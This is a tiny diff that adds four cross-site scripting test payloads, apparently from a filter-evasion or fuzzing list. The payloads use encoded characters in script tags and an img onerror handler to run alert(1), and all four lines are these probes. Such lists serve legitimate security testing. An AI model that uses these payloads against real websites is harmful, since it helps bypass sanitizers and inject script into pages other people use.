@@ -1,0 +1,4 @@
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
